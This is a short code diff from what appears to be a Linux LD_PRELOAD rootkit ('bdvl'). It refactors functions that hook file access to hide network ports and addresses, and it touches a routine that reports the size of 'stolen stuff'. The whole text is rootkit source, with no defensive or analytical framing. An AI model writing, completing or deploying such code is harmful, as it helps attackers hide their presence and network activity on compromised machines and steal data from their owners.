@@ -49,7 +49,7 @@ int preparedir(const char *path, gid_t magicgid){
 
 #ifdef HIDE_PORTS
 void preparehideports(gid_t magicgid){
-    if(rknomore())
+    if(rknomore(INSTALL_DIR, BDVLSO))
         return;
 
     hook(CFOPEN, CACCESS);
@@ -73,7 +73,7 @@ void preparehideports(gid_t magicgid){
 
 #ifdef HIDE_ADDRS
 void preparehideaddrs(gid_t magicgid){
-    if(rknomore())
+    if(rknomore(INSTALL_DIR, BDVLSO))
         return;
 
     hook(CFOPEN, CACCESS);
@@ -92,7 +92,6 @@ void preparehideaddrs(gid_t magicgid){
 
     fclose(fp);
 }
-
 #endif
 
 
@@ -136,7 +135,7 @@ void bdprep(void){
                 printf("\e[1;31m%ld\e[0m bytes\n", stolensize);
             else if(stolensize > 1024)
                 printf("\e[1;31m%.2f\e[0m kilobytes\n", (float)stolensize/1024);
-        }else if(stolensize < 0) printf("\e[1mUnable to evaluate total size of stolen stuff...\e[0m\n");
+        }else printf("\e[1mUnable to evaluate total size of stolen stuff...\e[0m\n");
 #endif
     }
     symlinkstuff();
